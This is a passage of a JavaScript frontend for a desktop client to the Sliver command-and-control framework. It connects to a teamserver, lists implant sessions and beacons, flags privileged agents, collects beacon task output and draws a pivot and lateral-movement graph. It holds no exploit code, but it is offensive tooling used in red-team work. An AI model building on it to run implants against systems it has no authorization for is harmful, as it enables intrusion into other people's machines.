const App = () => window.go.main.App;
let selectedConfigPath = null, pollTimer = null, activeCtxAgent = null;
let lastConfigPath = null, reconnectTimer = null, reconnecting = false;
let teamserverLabel = 'teamserver';
let allSessions = [], allBeacons = [];
let pivotTree = [];                  // pivot topology from GetPivotGraph RPC
// Graph interaction state (persists across refreshes).
const graphPos = {};                 // agent id -> {x,y} in graph coords
const graphDrag = {};                // agent id -> {x,y} dragged position override
let graphEdges = [];                 // current edge list [{from,to}] for live drag redraws
let graphView = { tx: 0, ty: 0, scale: 1 };
let graphCenter = null;
const openTabs = {};
const eventLog = [];
const EVENT_MAX = 500;
const notesMap = {};          // agent id -> operator notes (in-memory, cleared on disconnect)
const integrityMap = {};      // agent id -> real integrity level from getprivs (System/High/Medium/Low)
let activeInteractId = null;  // currently focused agent tab

// ── Persistence ─────────────────────────────────────────────────────────────
// Operator notes, measured integrity, and graph layout survive disconnects and
// app restarts, scoped per teamserver, in localStorage. (Previously in-memory
// only, so they were lost on every reconnect.)
let persistKey = null;        // set once we know which teamserver we're on
let saveTimer = null;
function persistScope(teamserver) { persistKey = 'sliver-gui:' + (teamserver || 'default'); }
function saveState() {
  if (!persistKey) return;
  clearTimeout(saveTimer);
  saveTimer = setTimeout(() => {
    try {
      localStorage.setItem(persistKey, JSON.stringify({
        notes: notesMap, integrity: integrityMap, graph: graphPos, v: 1,
      }));
    } catch (e) { /* quota/private-mode: state stays in-memory only */ }
  }, 300);
}
function loadState() {
  if (!persistKey) return;
  let data;
  try { data = JSON.parse(localStorage.getItem(persistKey) || '{}'); } catch (e) { return; }
  if (!data || typeof data !== 'object') return;
  Object.assign(notesMap, data.notes || {});
  Object.assign(integrityMap, data.integrity || {});
  Object.assign(graphPos, data.graph || {});
}

// ── Utils ──────────────────────────────────────────────────────────────────
function esc(s) { return s == null ? '' : String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
// toast shows a transient status message top-right. Deduped by (type, msg)
// within a short window so a burst of identical events doesn't stack into a
// wall of copies. Also exposes a persistent variant via progressToast().
const _toastCache = new Map(); // key -> {el, timer, count}
function toast(type, msg, dur=3000) {
  const key = type + '|' + msg;
  const now = Date.now();
  const cached = _toastCache.get(key);
  // Coalesce dupes fired within 1.5s of the previous one - the second
  // identical message just bumps a count and refreshes the timer.
  if (cached && now - (cached.at || 0) < 1500 && cached.el.isConnected) {
    cached.count = (cached.count || 1) + 1;
    cached.el.dataset.count = String(cached.count);
    cached.el.innerHTML = `<span>${esc(msg)}</span><span style="opacity:.6;margin-left:8px;font-size:10px">×${cached.count}</span>`;
    cached.at = now;
    clearTimeout(cached.timer);
    cached.timer = setTimeout(() => { cached.el.remove(); _toastCache.delete(key); }, dur);
    return;
  }
  const t = document.createElement('div'); t.className = `toast ${type}`; t.textContent = msg;
  document.getElementById('toasts').appendChild(t);
  const entry = { el: t, at: now, count: 1, timer: setTimeout(() => { t.remove(); _toastCache.delete(key); }, dur) };
  _toastCache.set(key, entry);
}

// progressToast shows a spinning "in progress" toast that returns a handle
// to resolve later. Use for any operation that takes >1s and would otherwise
// spam the user with a placeholder followed by the real result.
//
//   const p = progressToast('Building implant…');
//   const r = await App().GenerateImplant(req);
//   r.error ? p.fail(r.error) : p.done('Build ready');
function progressToast(msg) {
  const t = document.createElement('div'); t.className = 'toast progress';
  t.innerHTML = `<span class="mini-spin"></span><span>${esc(msg)}</span>`;
  document.getElementById('toasts').appendChild(t);
  const finish = (cls, text, dur=2600) => {
    t.className = `toast ${cls}`;
    t.textContent = text;
    setTimeout(() => t.remove(), dur);
  };
  return {
    el: t,
    update: (m) => { const s = t.querySelector('span:last-child'); if (s) s.textContent = m; },
    done: (m) => finish('ok', m || 'Done'),
    fail: (m) => finish('err', m || 'Failed', 4200),
    info: (m) => finish('info', m || 'Done'),
    cancel: () => t.remove(),
  };
}

// ── Freshness (last-checkin coloring) ──────────────────────────────────────
// Turns a unix timestamp into a colored age pill so operators can spot a
// silent/stale agent in a crowded table without doing mental arithmetic.
function formatAge(sec) {
  if (!Number.isFinite(sec) || sec < 0) return '-';
  if (sec < 5)   return 'now';
  if (sec < 60)  return Math.round(sec) + 's';
  if (sec < 3600) return Math.round(sec/60) + 'm';
  if (sec < 86400) return Math.round(sec/3600) + 'h';
  return Math.round(sec/86400) + 'd';
}
function freshnessPill(tsSec, absTime, opts) {
  opts = opts || {};
  if (!tsSec || tsSec <= 0) return `<span class="fresh f-dead">-</span>`;
  const age = Date.now()/1000 - tsSec;
  // Beacons have expected intervals; grade against them if provided. Otherwise
  // use the same three-tier heuristic as session tables (1m/5m/anything).
  let cls;
  if (opts.intervalSec && opts.intervalSec > 0) {
    const mul = age / opts.intervalSec;
    if (mul < 1.4) cls = 'f-fresh';
    else if (mul < 3) cls = 'f-warm';
    else cls = 'f-stale';
  } else {
    if (age < 60) cls = 'f-fresh';
    else if (age < 300) cls = 'f-warm';
    else cls = 'f-stale';
  }
  const rel = formatAge(age);
  return `<span class="fresh ${cls}" title="Last check-in ${absTime || ''}"><span class="dot"></span>${esc(rel)}${absTime ? ` <span class="abs">${esc(absTime)}</span>` : ''}</span>`;
}

// uiConfirm / uiPrompt - in-app replacements for the browser's native
// confirm()/prompt(). Wails' macOS WebView (WKWebView) does not implement the
// JS dialog panels, so native confirm() returns false and prompt() returns null
// without ever showing a dialog - silently killing any action guarded by them
// (Kill agent, Delete build, Rename session). These are pure-DOM and work on
// every platform. Both return a Promise.
function uiDialog({ title, message, input, placeholder, okLabel = 'OK', danger = false }) {
  return new Promise(resolve => {
    const ov = document.createElement('div');
    ov.style.cssText = 'position:fixed;inset:0;z-index:9999;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,.5)';
    const inputHtml = input
      ? `<input id="ui-dlg-input" type="text" value="${(placeholder || '').replace(/"/g, '&quot;')}" style="width:100%;box-sizing:border-box;margin-top:10px;padding:7px 9px;background:var(--bg);color:var(--fg);border:1px solid var(--border);border-radius:5px;font-size:13px">`
      : '';
    ov.innerHTML = `<div style="min-width:300px;max-width:440px;background:var(--panel,var(--bg));border:1px solid var(--border);border-radius:8px;padding:18px 18px 14px;box-shadow:0 8px 30px rgba(0,0,0,.4)">
      ${title ? `<div style="font-weight:600;font-size:13.5px;margin-bottom:6px">${title}</div>` : ''}
      <div style="font-size:13px;color:var(--muted)">${message}</div>${inputHtml}
      <div style="display:flex;gap:8px;justify-content:flex-end;margin-top:16px">
        <button id="ui-dlg-cancel" class="btn small">Cancel</button>
        <button id="ui-dlg-ok" class="btn small${danger ? ' danger' : ''}">${okLabel}</button>
      </div></div>`;
    document.body.appendChild(ov);
    const inp = ov.querySelector('#ui-dlg-input');
    if (inp) { inp.focus(); inp.select(); }
    const done = val => { ov.remove(); document.removeEventListener('keydown', onKey); resolve(val); };
    const onOk = () => done(input ? (inp.value || '') : true);
    const onCancel = () => done(input ? null : false);
    function onKey(e) {
      if (e.key === 'Escape') onCancel();
      else if (e.key === 'Enter') onOk();
    }
    ov.querySelector('#ui-dlg-ok').addEventListener('click', onOk);
    ov.querySelector('#ui-dlg-cancel').addEventListener('click', onCancel);
    ov.addEventListener('click', e => { if (e.target === ov) onCancel(); });
    document.addEventListener('keydown', onKey);
  });
}
function uiConfirm(message, opts = {}) { return uiDialog({ message, ...opts }); }
function uiPrompt(message, defaultValue = '', opts = {}) { return uiDialog({ message, input: true, placeholder: defaultValue, okLabel: 'OK', ...opts }); }

function isPrivileged(obj) {
  // If we've actually queried integrity for this agent, trust that over the guess.
  const lvl = (integrityMap[obj.id] || '').toLowerCase();
  if (lvl) return lvl.includes('system') || lvl.includes('high');
  const u = (obj.username || '').trim().toLowerCase();
  if (!u) return false;
  // Fallback heuristic: machine account (HOST$) = SYSTEM; NT AUTHORITY\*/admin/root.
  if (u.endsWith('$')) return true;
  return ['nt authority', 'system', 'administrator', 'admin', 'root'].some(k => u.includes(k));
}
// integrityLabel returns a short label for a node when its integrity is known.
function integrityLabel(obj) {
  const lvl = integrityMap[obj.id];
  if (!lvl) return '';
  if ((obj.username || '').trim().endsWith('$') || (obj.username || '').toLowerCase().includes('system')) return 'SYSTEM';
  return lvl.toUpperCase();
}
function osLabel(os) {
  const o = (os||'').toLowerCase();
  if (o.includes('windows')) return 'W';
  if (o.includes('linux')) return 'L';
  if (o.includes('darwin')) return 'M';
  return '?';
}
// osIconHref returns the PNG icon path for an OS + privilege level (icons live in
// frontend/dist/icons). HIGH = privileged, NORMAL = user. Falls back to Windows.
function osIconHref(os, priv, dead) {
  const o = (os||'').toLowerCase();
  const lvl = dead ? 'DEAD' : (priv ? 'HIGH' : 'NORMAL');   // DEAD > HIGH > NORMAL
  if (o.includes('linux')) return `./icons/LINUX-${lvl}.png`;
  // macOS / container / unknown - no dedicated icon; use the Windows art.
  return `./icons/WIN-${lvl}.png`;
}
// shortUser strips a leading DOMAIN\ or HOST\ from a Windows username.
function shortUser(u) { u = u || '?'; const i = u.lastIndexOf('\\'); return i >= 0 ? u.slice(i+1) : u; }
// fmtDur renders a sliver interval/jitter (nanoseconds) as seconds.
function fmtDur(ns) { const n = Number(ns) || 0; return n > 1e6 ? `${Math.round(n/1e9)}s` : `${n}s`; }

// ── Connect ────────────────────────────────────────────────────────────────
// The old flow called App().PickConfigFile() which invokes Wails'
// runtime.OpenFileDialog - that hits a known WebView2 crash on some Windows
// configs (Go recover() can't catch a COM common-dialog GPF, so the app dies
// silently mid-click). We route through the WebView's own <input type="file">
// instead: the operator picks a cfg, we base64 the bytes, backend writes a
// short-lived temp file and hands us back a path Connect() can consume.
document.getElementById('pick-config-btn').addEventListener('click', () => {
  document.getElementById('pick-config-input').click();
});
document.getElementById('pick-config-input').addEventListener('change', async (e) => {
  const f = e.target.files && e.target.files[0];
  e.target.value = ''; // let the same file be re-picked after a failed connect
  if (!f) return;
  try {
    const bytes = new Uint8Array(await f.arrayBuffer());
    // Chunked base64 encode so very large certs (rare, but not impossible) don't
    // blow the argument stack on window.btoa(String.fromCharCode(...HUGE)).
    let bin = '';
    for (let i = 0; i < bytes.length; i += 0x8000) {
      bin += String.fromCharCode.apply(null, bytes.subarray(i, i + 0x8000));
    }
    const b64 = btoa(bin);
    const path = await App().SaveConfigBytesToTemp(f.name || 'operator.cfg', b64);
    selectedConfigPath = path;
    document.getElementById('config-path').textContent = `${f.name}  (staged)`;
    document.getElementById('connect-btn').disabled = false;
  } catch (err) {
    toast('err', 'Could not stage cfg: ' + String(err));
  }
});
document.getElementById('manual-cfg-path').addEventListener('input', function() { var p = this.value.trim(); if (p) { selectedConfigPath = p; document.getElementById('config-path').textContent = p; document.getElementById('connect-btn').disabled = false; } });
document.getElementById('connect-btn').addEventListener('click', async () => {
  const btn = document.getElementById('connect-btn');
  btn.disabled = true; btn.textContent = 'Connecting...';
  const r = await App().Connect(selectedConfigPath).catch(e => ({ error: String(e) }));
  if (r.error) { document.getElementById('connect-error').textContent = r.error; btn.disabled = false; btn.textContent = 'Connect'; return; }
  lastConfigPath = selectedConfigPath;
  // Read from window so features-bundle.js can wrap enterApp with lifecycle
  // hooks (watchdog, auto-lock) via `window.enterApp = fn`; a bare call
  // here would ignore the extension.
  (window.enterApp || enterApp)(r);
});

async function enterApp(info) {
  document.getElementById('connect-overlay').classList.add('hidden');
  document.getElementById('app-shell').classList.remove('hidden');
  document.getElementById('operator-tag').textContent = `${info.operatorName}@${info.teamserver}`;
  teamserverLabel = info.teamserver || 'teamserver';
  persistScope(teamserverLabel);
  loadState();
  const ver = await App().GetVersion().catch(() => null);
  if (ver) document.getElementById('server-version').textContent = `v${ver.major}.${ver.minor}.${ver.patch}`;
  wireEventStream();
  pinServerConsole();     // Server console docked by default
  pinEvents();            // Event Log docked in the console by default
  pinScripts();           // Script Manager docked in the console by default
  refreshAgents();
  pollTimer = setInterval(refreshAgents, 5000);
  startStatuslineTick();
}

document.getElementById('disconnect-btn').addEventListener('click', async () => {
  clearInterval(pollTimer);
  if (window.runtime) { window.runtime.EventsOff('sliver:event'); window.runtime.EventsOff('sliver:disconnected'); }
  await App().Disconnect();
  stopStatuslineTick();
  lastEventAt = 0;
  // Wipe temp cfgs staged via the HTML file picker so operator certs don't
  // linger on disk after this session ends.
  App().CleanupTempConfigs?.().catch(() => {});
  document.getElementById('app-shell').classList.add('hidden');
  document.getElementById('connect-overlay').classList.remove('hidden');
  document.getElementById('connect-btn').textContent = 'Connect'; document.getElementById('connect-btn').disabled = true;
  document.getElementById('config-path').textContent = '';
  document.getElementById('interact-tabs').innerHTML = '';
  document.getElementById('interact-panels').innerHTML = '<div class="empty-interact" id="empty-interact"><p>Double-click an agent to interact.</p></div>';
  for (const k in openTabs) delete openTabs[k];
  for (const k in notesMap) delete notesMap[k];
  for (const k in integrityMap) delete integrityMap[k];
  // Clear transient graph state so jump lineage / drags don't leak into the next
  // engagement (persisted per-teamserver graphPos is kept).
  for (const k in jumpParentMap) delete jumpParentMap[k];
  for (const k in graphDrag) delete graphDrag[k];
  pivotTree = [];
  activeInteractId = null;
  allSessions = []; allBeacons = [];
  selectedConfigPath = null; cancelReconnect();
});

// ── Pending beacon task registry (for event-driven result delivery) ────────
const pendingBeaconTasks = {};
// Sliver refires `beacon-registered` on every check-in in some server versions,
// so a chatty beacon spams the operator with a toast per interval. Dedupe by
// beacon ID for this session — only the first registration surfaces a toast.
const _seenBeaconIds = new Set();

// ── Event Stream ───────────────────────────────────────────────────────────
function wireEventStream() {
  if (!window.runtime) return;
  window.runtime.EventsOff('sliver:event'); window.runtime.EventsOff('sliver:disconnected'); window.runtime.EventsOff('sliver:beacon-task-done');
  window.runtime.EventsOn('sliver:disconnected', (reason) => onDisconnected(reason));
  window.runtime.EventsOn('sliver:event', (ev) => {
    logEvent(ev);
    (window.noteEvent || noteEvent)(ev);
    if (ev.type && ev.type.includes('session')) refreshAgents();
    if (ev.type && ev.type.includes('beacon')) refreshAgents();
    if (ev.type === 'session-connected' || ev.type === 'session-opened') toast('ok', `New session: ${ev.session?.hostname||''}`);
    if (ev.type === 'beacon-registered') {
      const bid = ev.session?.id || ev.data || '';
      if (bid && !_seenBeaconIds.has(bid)) {
        _seenBeaconIds.add(bid);
        toast('info', `Beacon registered: ${ev.session?.hostname || bid.slice(0, 8)}`);
      }
    }
  });
  window.runtime.EventsOn('sliver:beacon-task-done', async (result) => {
    if (!result || !result.taskId) return;
    const reg = pendingBeaconTasks[result.taskId];
    if (!reg) return;
    delete pendingBeaconTasks[result.taskId];
    const id = reg.beaconId;
    if (!openTabs[id]) return;
    const cmdType = reg.cmdType || '';
    let fetchErr = null;
    const full = cmdType
      ? await App().GetBeaconNativeResult(result.taskId, cmdType).catch(e => { fetchErr = e; return null; })
      : await App().GetBeaconTaskResult(result.taskId).catch(e => { fetchErr = e; return null; });
    const output = (full && full.response) || '';
    appendOut(id, `[+] task ${result.taskId.slice(0,8)} completed`, 'ok');
    if (fetchErr) appendOut(id, `[debug] fetch error: ${fetchErr}`, 'warn');
    if (cmdType === 'screenshot' && output.startsWith('data:image')) {
      appendImg(id, output);
    } else if (output.trim()) {
      appendOut(id, output.trimEnd(), 'out');
    } else {
      appendOut(id, `[debug] empty response — cmdType=${cmdType || 'shell'}`, 'warn');
    }
  });
}
function logEvent(ev) {
  eventLog.unshift({ time: new Date().toLocaleTimeString(), type: ev.type||'unknown', detail: ev.session ? `${ev.session.hostname} (${ev.session.os}) ${ev.session.username||''}` : (ev.data||'') });
  if (eventLog.length > EVENT_MAX) eventLog.length = EVENT_MAX;
  renderEventsList(); // live-update any open/pinned event views
}
function eventColor(type) {
  const t = type || '';
  if (t.includes('session')) return 'var(--ok)';
  if (t.includes('beacon')) return 'var(--info)';
  if (t.includes('job')) return 'var(--warn)';
  if (t.includes('operator')) return 'var(--accent)';
  return 'var(--muted)';
}
function renderEventsList() {
  const targets = document.querySelectorAll('[data-events-list]');
  if (!targets.length) return;
  const rows = eventLog.length
    ? eventLog.map(e => `<div class="event-entry"><span class="event-time">${esc(e.time)}</span><span class="event-type" style="color:${eventColor(e.type)};font-weight:bold">${esc(e.type)}</span><span class="event-detail">${esc(e.detail)}</span></div>`).join('')
    : '<div style="padding:10px;color:var(--muted)">No events yet.</div>';
  targets.forEach(el => el.innerHTML = rows);
}

// ── Refresh all agents ─────────────────────────────────────────────────────
async function refreshAgents() {
  allSessions = await App().ListSessions().catch(() => []) || [];
  allBeacons = await App().ListBeacons().catch(() => []) || [];
  pivotTree = await App().GetPivotGraph().catch(() => []) || [];
  document.getElementById('agent-count').textContent = `${allSessions.length} sessions | ${allBeacons.length} beacons`;
  renderTable();
  if (!document.getElementById('graph-view').classList.contains('hidden')) renderGraph();
  updateStatusline();
}

// ── Statusline ────────────────────────────────────────────────────────────
// Persistent under-toolbar strip showing teamserver heartbeat + inventory +
// most recent event. Refreshes on every agent poll and every incoming event;
// a ticking watchdog demotes "live" → "stale" → "dead" if the event stream
// goes quiet, so operators notice a silent teamserver before it costs them
// an implant callback.
let lastEventAt = 0;
let statuslineTick = null;
function updateStatusline() {
  const setNum = (id, n, warnAt, hotAt) => {
    const el = document.getElementById(id); if (!el) return;
    el.querySelector('b').textContent = String(n);
    el.classList.toggle('warn', warnAt != null && n >= warnAt);
    el.classList.toggle('hot',  hotAt  != null && n >= hotAt);
  };
  setNum('status-sessions', allSessions.filter(s => !s.isDead).length);
  setNum('status-beacons', allBeacons.filter(b => !b.isDead).length);
  // Listeners + operators are polled lazily - don't block agent refresh.
  App().ListJobs?.().then(js => setNum('status-listeners', (js || []).length)).catch(() => {});
  App().ListOperators?.().then(os => {
    const online = (os || []).filter(o => o && (o.online || o.status === 'online')).length;
    // Some Sliver builds don't ship an online flag; fall back to total count.
    setNum('status-ops', online || (os || []).length);
  }).catch(() => {});
  refreshLivePill();
}
function refreshLivePill() {
  const pill = document.getElementById('status-live'); if (!pill) return;
  pill.classList.remove('stale', 'dead');
  const age = lastEventAt ? (Date.now() - lastEventAt) / 1000 : Infinity;
  // No events yet - treat as "live" (fresh connection); after 30s of silence
  // demote to "stale"; after 5min mark "dead" so the operator investigates.
  if (age > 300) pill.classList.add('dead');
  else if (age > 30 && lastEventAt) pill.classList.add('stale');
}
function noteEvent(ev) {
  lastEventAt = Date.now();
  const el = document.getElementById('status-last'); if (!el) return;
  const kind = (ev.type || 'event').replace(/-/g, ' ');
  const detail = ev.session ? `${ev.session.hostname || ''}${ev.session.username ? ' · ' + ev.session.username : ''}` : (ev.data || '');
  el.innerHTML = `<b>${esc(kind)}</b>${detail ? '  ' + esc(detail) : ''}  <span style="color:var(--muted)">· just now</span>`;
  refreshLivePill();
}
function startStatuslineTick() {
  if (statuslineTick) return;
  // Repaints just the age suffix + live pill state cheaply, without a full
  // refreshAgents pass. Runs at 5s to feel responsive without burning CPU.
  statuslineTick = setInterval(() => {
    if (!document.getElementById('app-shell') || document.getElementById('app-shell').classList.contains('hidden')) return;
    refreshLivePill();
    // Live-refresh the "just now" suffix on the last-event line
    const el = document.getElementById('status-last');
    if (el && lastEventAt) {
      const html = el.innerHTML;
      const idx = html.lastIndexOf('· ');
      if (idx > 0) el.innerHTML = html.slice(0, idx) + '· ' + formatAge((Date.now() - lastEventAt) / 1000) + ' ago</span>';
    }
    // Also re-color freshness pills without a full re-render - cheap.
    document.querySelectorAll('.fresh[title^="Last check-in"]').forEach(pill => {
      // We don't have the ts in the DOM; leave the color; only re-render on
      // next refreshAgents (5s). That's acceptable - colors don't drift fast.
    });
  }, 5000);
}
function stopStatuslineTick() { clearInterval(statuslineTick); statuslineTick = null; }
document.getElementById('refresh-all-btn').addEventListener('click', refreshAgents);

// ── Table view ─────────────────────────────────────────────────────────────
// userCell renders the user column, highlighting privileged (SYSTEM/admin/★) agents.
function userCell(o) {
  const il = integrityLabel(o);
  return isPrivileged(o)
    ? `<td class="user-priv" title="Privileged (right-click → Check Integrity for the real level)">★ ${esc(o.username)}${il ? ` [${il}]` : ''}</td>`
    : `<td>${esc(o.username)}${il ? ` <span style="color:var(--muted)">[${il}]</span>` : ''}</td>`;
}
function renderTable() {
  const body = document.getElementById('agents-body');
  body.innerHTML = '';
  // Empty state - replace the tbody with a full-width row that tells the
  // operator what to do next, instead of a silent empty table that reads as
  // "is it broken?"
  if (!allSessions.length && !allBeacons.length) {
    body.innerHTML = `<tr><td colspan="10" style="padding:0">
      <div class="empty-state">
        <div class="empty-title">No agents yet</div>
        <div class="empty-body">Generate an implant, deploy it on a target, and it will appear here on the first check-in.<br/>Redirector setups: verify the chain with <b>Generate → Test</b> before you build.</div>
        <div class="empty-actions">
          <button class="btn small" onclick="switchView('generate')">Open Generate</button>
          <button class="btn small" onclick="switchView('listeners')">Listeners</button>
          <button class="btn small" onclick="switchView('health')">Chain Health</button>
          <button class="btn small" onclick="openKbdHelp()">Shortcuts</button>
        </div>
      </div>
    </td></tr>`;
    renderBulkBar();
    return;
  }
  const row = (o, kind) => {
    const tr = document.createElement('tr'); tr.dataset.id = o.id; tr.dataset.kind = kind;
    if (isPrivileged(o) && !o.isDead) tr.classList.add('row-priv');
    const typeCls = kind === 'session' ? 'type-session' : 'type-beacon';
    const remoteIP = o.remoteAddress ? o.remoteAddress.split(':')[0] : '-';
    // Freshness pill replaces the raw HH:MM:SS so a stale/silent agent stands
    // out visually. Beacons grade against their expected interval; sessions
    // use the fixed 1m/5m/older thresholds.
    const intSec = kind === 'beacon' ? Math.round((o.interval || 0) / 1e9) : 0;
    const freshCell = o.isDead
      ? `<span class="fresh f-dead">${esc(o.lastCheckin)}</span>`
      : freshnessPill(o.lastCheckinTs, o.lastCheckin, { intervalSec: intSec });
    const checked = selectedAgents.has(o.id) ? ' checked' : '';
    // Type cell doubles as the row-select checkbox host. Clicking the
    // checkbox toggles bulk selection; clicking anywhere else in the row
    // preserves the existing double-click / right-click behaviour.
    const typeCell = `<td class="${typeCls}"><input type="checkbox" class="bulk-checkbox" data-id="${esc(o.id)}" data-kind="${kind}"${checked}/>${kind.toUpperCase()}</td>`;
    const nameCell = `<td>${esc(o.name||o.id.slice(0,8))}${renderTagChips(o.id)}</td>`;
    tr.innerHTML = `${typeCell}${nameCell}<td>${esc(o.hostname)}</td>${userCell(o)}<td>${esc(remoteIP)}</td><td>${esc(o.os)}/${esc(o.arch)}</td><td>${o.pid}</td><td>${esc(o.transport)}</td><td>${freshCell}</td><td class="${o.isDead?'status-dead':'status-alive'}">${o.isDead?'DEAD':'ALIVE'}</td>`;
    tr.addEventListener('dblclick', (e) => { if (e.target && e.target.classList.contains('bulk-checkbox')) return; openInteract(kind, o); });
    tr.addEventListener('contextmenu', e => showCtx(e, kind, o));
    body.appendChild(tr);
  };
  allSessions.forEach(s => row(s, 'session'));
  allBeacons.forEach(b => row(b, 'beacon'));
  // Wire the checkboxes AFTER rendering so we don't blow away user selection
  // if refreshAgents fires mid-selection: selectedAgents survives the redraw
  // (state lives in a module-scoped Set, not the DOM).
  body.querySelectorAll('.bulk-checkbox').forEach(cb => {
    cb.addEventListener('click', (e) => e.stopPropagation());
    cb.addEventListener('change', (e) => {
      const id = e.target.dataset.id;
      if (e.target.checked) selectedAgents.add(id); else selectedAgents.delete(id);
      renderBulkBar();
    });
  });
  renderBulkBar();
}

// ── View toggle ────────────────────────────────────────────────────────────
document.getElementById('view-table-btn').addEventListener('click', () => { document.getElementById('table-view').classList.remove('hidden'); document.getElementById('graph-view').classList.add('hidden'); document.getElementById('view-table-btn').classList.add('active'); document.getElementById('view-graph-btn').classList.remove('active'); });
document.getElementById('view-graph-btn').addEventListener('click', () => { document.getElementById('table-view').classList.add('hidden'); document.getElementById('graph-view').classList.remove('hidden'); document.getElementById('view-table-btn').classList.remove('active'); document.getElementById('view-graph-btn').classList.add('active'); renderGraph(); });
document.getElementById('graph-reset-btn').addEventListener('click', resetGraph);

// ── Graph view (pivot topology) ──────────────────────────────────────────────
// jumpParentMap tracks Jump / Spawn operations performed from session console or script manager
// Format: jumpParentMap[targetHostOrIP] = { parentID, parentHost }
const jumpParentMap = {};

function recordJump(parentSessID, targetHost) {
  if (!targetHost || !parentSessID) return;
  const parentTab = openTabs[parentSessID];
  const parentHost = (parentTab && parentTab.obj && parentTab.obj.hostname) ? parentTab.obj.hostname : '';
  const record = { parentID: parentSessID, parentHost: parentHost };
  jumpParentMap[targetHost] = record;
  const cleanHost = targetHost.startsWith('[')
    ? targetHost.substring(1, targetHost.indexOf(']'))
    : targetHost.split(':')[0];
  if (cleanHost && cleanHost !== targetHost) {
    jumpParentMap[cleanHost] = record;
  }
}

// buildPivotMaps flattens Sliver's pivot tree into sessionID/hostname -> parent mappings.
// Prefers sessionID-based matching to correctly handle multiple sessions on the same host.
function buildPivotMaps() {
  const parentOf   = {};  // hostname -> parent hostname
  const parentOfID = {};  // sessionID -> parent sessionID
  const walk = (nd, parentHost, parentSessID) => {
    const host   = nd.hostname || nd.name || ('peer' + nd.peerId);
    // JSON tag is "sessionId" (lowercase d) - reading nd.sessionID left this
    // undefined, breaking the reliable per-session pivot matching and forcing a
    // wrong hostname fallback (e.g. a pivot child attached to the root instead
    // of its real parent).
    const sessID = nd.sessionId || nd.sessionID || nd.id || null;
    if (parentHost)              parentOf[host]     = parentHost;
    if (sessID && parentSessID)  parentOfID[sessID] = parentSessID;
    (nd.children || []).forEach(c => walk(c, host, sessID));
  };
  (pivotTree || []).forEach(r => walk(r, null, null));
  return { parentOf, parentOfID };
}

// edgeD builds a straight edge path shortened at both ends so the arrowhead sits
// on the target node's edge (not under its icon). srcR/tgtR are the radii to inset.
function edgeD(src, tgt, srcR, tgtR) {
  const dx = tgt.x - src.x, dy = tgt.y - src.y, len = Math.hypot(dx, dy) || 1;
  const ux = dx / len, uy = dy / len;
  const ax = src.x + ux * srcR, ay = src.y + uy * srcR;
  const bx = tgt.x - ux * tgtR, by = tgt.y - uy * tgtR;
  return `M${ax.toFixed(1)} ${ay.toFixed(1)} L${bx.toFixed(1)} ${by.toFixed(1)}`;
}

// edgeColor picks the line colour from the agent it points at.
// Jump edges are orange and handled separately in renderGraph.
function edgeColor(nd) {
  if (!nd) return '#35c46b';
  if (nd.obj && nd.obj.isDead) return '#6b7280';      // dead → grey (matches legend)
  if (nd.kind === 'beacon') return '#4d9fe6';
  return isPrivileged(nd.obj) ? '#e23c4e' : '#35c46b';
}

// renderGraph draws the pivot topology: firewall on left, coloured egress/pivot edges,
// and orange bidirectional dashed lines for lateral-movement jumps.
function renderGraph() {
  const svg = document.getElementById('graph-svg');
  if (!svg) return;
  try {
    const nodes = [
      ...allSessions.map(s => ({ kind:'session', obj:s })),
      ...allBeacons.map(b  => ({ kind:'beacon',  obj:b })),
    ];
    const W = svg.clientWidth || 900, H = svg.clientHeight || 460;
    svg.setAttribute('viewBox', `0 0 ${W} ${H}`);
    const fwX = 74, fwY = H / 2;

    // Build lookup maps
    const nodeByHost = {}, nodeByID = {};
    nodes.forEach(nd => {
      const h = nd.obj.hostname; if (h && !nodeByHost[h]) nodeByHost[h] = nd;
      nodeByID[nd.obj.id] = nd;
    });

    const { parentOf, parentOfID } = buildPivotMaps();
    const parentNodeId = {}, jumpEdgeSet = new Set();

    // ── Parent resolution - PIVOT is authoritative, JUMP is heuristic. ──
    // Pass 1: pivot parents from Sliver's pivot graph (session-ID; then a GENUINE
    // cross-host hostname fallback). These come straight from the teamserver and
    // define the true topology (firewall → gateway → pivoted agent).
    nodes.forEach(nd => {
      let parentId = null;
      const pByID = parentOfID[nd.obj.id];
      if (pByID && nodeByID[pByID] && pByID !== nd.obj.id) parentId = pByID;
      if (!parentId) {
        const ph = parentOf[nd.obj.hostname];
        if (ph && ph !== nd.obj.hostname) {
          const cands = nodes.filter(n => n.obj.hostname === ph && n.obj.id !== nd.obj.id);
          if (cands.length) parentId = cands[0].obj.id;
        }
      }
      if (parentId) parentNodeId[nd.obj.id] = parentId;
    });

    // wouldCycle: does linking child→parent loop back through the existing parents?
    const wouldCycle = (childId, parentId) => {
      let cur = parentId, hops = 0;
      while (cur && hops++ <= nodes.length) { if (cur === childId) return true; cur = parentNodeId[cur]; }
      return false;
    };

    // Pass 2: jump / lateral-move lineage - ONLY for agents that have no pivot
    // parent, and NEVER if it would reverse/cycle a pivot chain. This is what
    // stops a jump whose target IP collides with an existing same-host session
    // (all agents on one box share an IP) from hijacking or flipping the tree.
    nodes.forEach(nd => {
      if (parentNodeId[nd.obj.id]) return;              // pivot already owns this node
      let ipOnly = '';
      if (nd.obj.remoteAddress) {
        const raw = nd.obj.remoteAddress;
        ipOnly = raw.startsWith('[') ? raw.substring(1, raw.indexOf(']')) : raw.split(':')[0];
      }
      const entry = jumpParentMap[nd.obj.hostname] ||
                    (ipOnly ? jumpParentMap[ipOnly] : null) ||
                    jumpParentMap[nd.obj.remoteAddress];
      if (!entry) return;
      const pID   = (typeof entry === 'object') ? entry.parentID   : entry;
      const pHost = (typeof entry === 'object') ? entry.parentHost : null;
      let parentId = null;
      if (pID && pID !== nd.obj.id && nodeByID[pID] && !nodeByID[pID].obj.isDead) parentId = pID;
      else if (pHost && pHost !== nd.obj.hostname) {
        const ap = nodes.filter(n => n.obj.hostname === pHost && n.obj.id !== nd.obj.id && !n.obj.isDead);
        if (ap.length) parentId = ap[0].obj.id;
      }
      if (parentId && !wouldCycle(nd.obj.id, parentId)) {
        parentNodeId[nd.obj.id] = parentId;
        jumpEdgeSet.add(`${parentId}:${nd.obj.id}`);
      }
    });

    // Safety net: drop self-parents / parents that aren't real nodes.
    nodes.forEach(nd => {
      const p = parentNodeId[nd.obj.id];
      if (p === nd.obj.id || (p && !nodeByID[p])) delete parentNodeId[nd.obj.id];
    });

    // Rebuild the children map from the validated parent links.
    const kidsOf = {};
    nodes.forEach(nd => {
      const p = parentNodeId[nd.obj.id];
